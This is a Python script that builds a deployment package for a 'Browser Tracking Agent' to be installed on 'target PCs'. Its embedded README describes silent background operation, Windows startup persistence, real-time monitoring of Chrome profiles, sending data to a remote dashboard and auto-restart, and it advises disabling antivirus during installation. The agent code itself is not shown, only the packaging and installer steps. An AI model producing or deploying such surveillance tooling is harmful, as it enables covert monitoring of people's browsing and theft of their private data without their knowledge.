"""
Create Deployment Package for Browser Tracking Agent
Creates a complete package ready for deployment to target PCs
"""

import os
import shutil
import zipfile
import json
from datetime import datetime

def create_deployment_package():
    """Create complete deployment package"""
    
    package_name = "BrowserTracker_Deployment"
    package_dir = f"{package_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    
    print("Creating Browser Tracking Agent Deployment Package...")
    print("=" * 60)
    
    # Create package directory
    if os.path.exists(package_dir):
        shutil.rmtree(package_dir)
    os.makedirs(package_dir)
    
    # Files to include in package
    files_to_copy = [
        # Main installer
        ("full_installer.py", "INSTALL.py"),
        
        # Agent files from vercel_client_configs
        ("vercel_client_configs/enhanced_agent.py", "agent_files/enhanced_agent.py"),
        ("vercel_client_configs/browser_reader.py", "agent_files/browser_reader.py"),
        ("vercel_client_configs/network_client.py", "agent_files/network_client.py"),
        ("vercel_client_configs/system_info.py", "agent_files/system_info.py"),
        ("vercel_client_configs/logger.py", "agent_files/logger.py"),
        ("vercel_client_configs/config.json", "agent_files/config.json"),
        ("vercel_client_configs/requirements.txt", "agent_files/requirements.txt"),
        
        # GUI and utilities
        ("simple_gui.py", "utilities/simple_gui.py"),
        ("background_service.py", "utilities/background_service.py"),
        ("setup_startup.py", "utilities/setup_startup.py"),
    ]
    
    # Copy files
    copied_files = 0
    for source, dest in files_to_copy:
        dest_path = os.path.join(package_dir, dest)
        dest_dir = os.path.dirname(dest_path)
        
        # Create destination directory
        os.makedirs(dest_dir, exist_ok=True)
        
        if os.path.exists(source):
            shutil.copy2(source, dest_path)
            print(f"✅ Copied: {source} -> {dest}")
            copied_files += 1
        else:
            print(f"⚠️  Missing: {source}")
    
    # Create README file
    readme_content = """
# Browser Tracking Agent - Deployment Package

## Quick Installation

1. **Run as Administrator** (recommended)
2. **Double-click**: `INSTALL.py`
3. **Follow prompts** and wait for completion
4. **Agent will start automatically** on next boot

## What This Package Contains

### Core Files:
- `INSTALL.py` - Main installer script
- `agent_files/` - Browser tracking agent components
- `utilities/` - Additional tools and GUI

### Installation Process:
1. **Auto-detects Python** (installs if missing)
2. **Installs dependencies** automatically
3. **Sets up Windows startup** integration
4. **Creates desktop shortcuts**
5. **Tests installation** before completion

## Manual Installation (if needed)

If automatic installation fails:

```cmd
# 1. Install Python 3.11+ from python.org
# 2. Copy agent_files to desired location
# 3. Install dependencies:
pip install -r agent_files/requirements.txt

# 4. Run agent:
python agent_files/enhanced_agent.py --start
```

## Features

✅ **Automatic Python Installation**
✅ **Silent Background Operation** 
✅ **Windows Startup Integration**
✅ **Real-time Browser Monitoring**
✅ **Multi-Profile Chrome Support**
✅ **Secure HTTPS Transmission**
✅ **Auto-restart on Crash**
✅ **GUI Management Interface**

## System Requirements

- **OS**: Windows 10/11
- **RAM**: 50MB minimum
- **Disk**: 100MB free space
- **Network**: Internet connection required
- **Browser**: Chrome (any version)

## Server Dashboard

Monitor all agents at: https://browser-tracking.vercel.app

## Troubleshooting

### Installation Issues:
- Run as Administrator
- Disable antivirus temporarily
- Check internet connection

### Agent Not Starting:
- Check Windows startup settings
- Run `utilities/simple_gui.py` for manual control
- Check logs in installation directory

### No Data in Dashboard:
- Verify internet connection
- Check agent status in GUI
- Restart agent if needed

## Support

For technical support or issues, contact system administrator.

---
Package created: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + """
Version: 1.0
"""
    
    readme_path = os.path.join(package_dir, "README.txt")
    with open(readme_path, 'w', encoding='utf-8') as f:
        f.write(readme_content)
    
    # Create installation batch file
    install_bat = f"""@echo off
echo Browser Tracking Agent - Quick Installer
echo ========================================
echo.

REM Change to script directory
cd /d "%~dp0"

REM Check for Python
python --version >nul 2>&1
if %errorlevel% == 0 (
    echo Python found, starting installation...
    python INSTALL.py
) else (
    echo Python not found, starting full installation...
    python INSTALL.py
)

echo.
echo Installation completed!
pause
"""
    
    install_bat_path = os.path.join(package_dir, "QUICK_INSTALL.bat")
    with open(install_bat_path, 'w') as f:
        f.write(install_bat)
    
    # Create package info
    package_info = {
        "name": "Browser Tracking Agent",
        "version": "1.0",
        "created": datetime.now().isoformat(),
        "files_included": copied_files,
        "server_url": "https://browser-tracking.vercel.app",
        "requirements": {
            "python": "3.11+",
            "os": "Windows 10/11",
            "memory": "50MB",
            "disk": "100MB"
        }
    }
    
    info_path = os.path.join(package_dir, "package_info.json")
    with open(info_path, 'w') as f:
        json.dump(package_info, f, indent=2)
    
    # Create ZIP package
    zip_name = f"{package_dir}.zip"
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(package_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arc_name = os.path.relpath(file_path, package_dir)
                zipf.write(file_path, arc_name)
    
    print("\n" + "=" * 60)
    print("✅ Deployment package created successfully!")
    print(f"📁 Directory: {package_dir}")
    print(f"📦 ZIP file: {zip_name}")
    print(f"📊 Files included: {copied_files}")
    print("\n🚀 Ready for deployment to target PCs!")
    print("\nDeployment Instructions:")
    print("1. Copy ZIP file to target PC")
    print("2. Extract ZIP file")
    print("3. Run QUICK_INSTALL.bat as Administrator")
    print("4. Follow installation prompts")
    print("5. Agent will start automatically")
    
    return package_dir, zip_name

if __name__ == "__main__":
    create_deployment_package()
